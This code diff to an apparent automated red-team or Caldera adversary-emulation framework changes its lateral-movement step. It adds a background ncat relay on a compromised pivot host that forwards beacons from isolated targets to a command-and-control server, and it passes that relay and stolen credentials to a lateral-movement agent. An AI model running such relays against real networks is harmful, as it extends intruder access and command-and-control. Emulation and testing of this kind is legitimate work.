@@ -123,7 +123,21 @@ def _dispatch_one(task: dict) -> dict:
                 cred = c
                 break
 
-        result = _lateral_agent.run(target_ip, credential=cred, pivot_runner=pivot_runner)
+        # For isolated targets reached via a pivot, start a Caldera TCP relay on
+        # the pivot so the target can beacon back through it.
+        caldera_server_url = None
+        if pivot_runner is not None:
+            relay_port = 8889
+            relay_cmd = (
+                f"nohup ncat -l -k -p {relay_port} "
+                f"--sh-exec 'ncat host.docker.internal 8888' "
+                f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
+            )
+            pivot_runner.run(relay_cmd)
+            caldera_server_url = f"http://{_web_intnet_ip}:{relay_port}"
+
+        result = _lateral_agent.run(target_ip, credential=cred, pivot_runner=pivot_runner,
+                                    caldera_server_url=caldera_server_url)
         if result["success"]:
             _runners[target_ip] = result["data"]["runner"]
         return {"task": f"lateral_move {target_ip}", **result}
